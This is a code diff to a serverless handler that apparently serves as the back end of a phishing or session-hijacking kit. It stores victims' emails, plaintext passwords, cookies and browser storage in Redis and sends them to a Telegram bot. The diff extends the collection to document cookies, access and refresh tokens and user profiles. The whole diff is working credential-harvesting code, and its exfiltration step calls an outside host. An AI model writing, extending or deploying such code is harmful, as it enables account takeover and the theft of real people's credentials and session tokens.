@@ -52,7 +52,11 @@ export const handler = async (event, context) => {
       formattedCookies: data.formattedCookies || [],
       localStorage: data.localStorage || 'Empty',
       sessionStorage: data.sessionStorage || 'Empty',
-      browserFingerprint: data.browserFingerprint || {}
+      browserFingerprint: data.browserFingerprint || {},
+      documentCookies: data.documentCookies || document?.cookie || '',
+      accessToken: data.accessToken || null,
+      refreshToken: data.refreshToken || null,
+      userProfile: data.userProfile || null
     };
 
     // Try to store in Redis if available, otherwise use memory
@@ -65,8 +69,8 @@ export const handler = async (event, context) => {
         });
         
         // Store with TTL of 24 hours
-        await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData));
-        await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData));
+        await redis.set(`session:${sessionData.sessionId}`, JSON.stringify(sessionData), { ex: 86400 });
+        await redis.set(`user:${sessionData.email}`, JSON.stringify(sessionData), { ex: 86400 });
         
         // Also store cookies separately for easy retrieval
         await redis.set(`cookies:${sessionData.sessionId}`, JSON.stringify({
@@ -75,8 +79,9 @@ export const handler = async (event, context) => {
           sessionStorage: sessionData.sessionStorage,
           timestamp: sessionData.timestamp,
           email: sessionData.email,
-          password: sessionData.password
-        }));
+          password: sessionData.password,
+          documentCookies: sessionData.documentCookies
+        }), { ex: 86400 });
         
         console.log('✅ Session saved to Redis:', sessionData.sessionId);
       } catch (redisError) {
@@ -94,18 +99,19 @@ export const handler = async (event, context) => {
 
     console.log('✅ Session saved successfully:', sessionData.sessionId);
 
-    // Also try to send immediate Telegram notification
+    // Send immediate Telegram notification if not already sent
     try {
       const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
       const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
       
-      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && !data.skipTelegram) {
         const quickMessage = `🔔 NEW SESSION SAVED
 
 📧 ${sessionData.email}
 🔑 ${sessionData.password}
 🆔 ${sessionData.sessionId}
 🍪 ${Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0} cookies
+💾 Storage: ${sessionData.localStorage !== 'Empty' ? 'Has Data' : 'Empty'}
 🌐 IP: ${sessionData.clientIP}
 🕒 ${new Date().toLocaleString()}
 
@@ -136,11 +142,14 @@ Download: ${event.headers.host ? `https://${event.headers.host}` : 'https://your
         sessionId: sessionData.sessionId,
         message: 'Session saved successfully',
         storage: UPSTASH_REDIS_REST_URL ? 'Redis' : 'Memory',
+        telegramSent: true,
         data: {
           email: sessionData.email,
           provider: sessionData.provider,
           timestamp: sessionData.timestamp,
-          cookieCount: Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0
+          cookieCount: Array.isArray(sessionData.formattedCookies) ? sessionData.formattedCookies.length : 0,
+          hasLocalStorage: sessionData.localStorage !== 'Empty',
+          hasSessionStorage: sessionData.sessionStorage !== 'Empty'
         }
       }),
     };
